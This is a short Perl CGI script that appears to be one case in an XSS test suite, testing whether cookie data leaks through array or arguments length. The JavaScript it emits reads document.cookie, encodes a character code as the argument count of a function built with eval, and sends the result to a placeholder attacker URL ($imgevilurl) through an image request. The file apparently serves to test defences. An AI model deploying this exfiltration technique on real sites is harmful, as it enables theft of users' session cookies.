#!/usr/bin/perl

require "xss_basic_vars.pl";

$title = "Tests array.length";
$evil = "document.cookie";

require "xss_basic_uses.pl";

require "xss_basic_cookie.pl";

require "xss_basic_header.pl";

require "xss_basic_bodystart.pl";

require "xss_basic_form.pl";

print qq|
    <script type="text/javascript">

		var reportdut = "";
		
		// gets the number of arguments and add it to the reporting
		// variable "reportdut"

		var mycookie = $evil;

/*		var dut = [];
		document.getElementById("testptag").innerHTML += "dut.length = " + dut.length;
		
		dut[0] = mycookie[0];
		
		document.getElementById("testptag").innerHTML += " now dut = " + dut + " dut.length = " + dut.length;
*/
		function count() { return arguments.length; };
		var x = "var dut = count(0";
		for (i = 0; i < mycookie.charCodeAt(0); i++) { x+= ",0"; }
		x += ");";
		eval(x);
		document.getElementById("testptag").innerHTML += x + " dut = " + dut;
		document.images[0].src = "$imgevilurl?form=" + dut;
				
    </script>
|;

require "xss_basic_footer.pl";
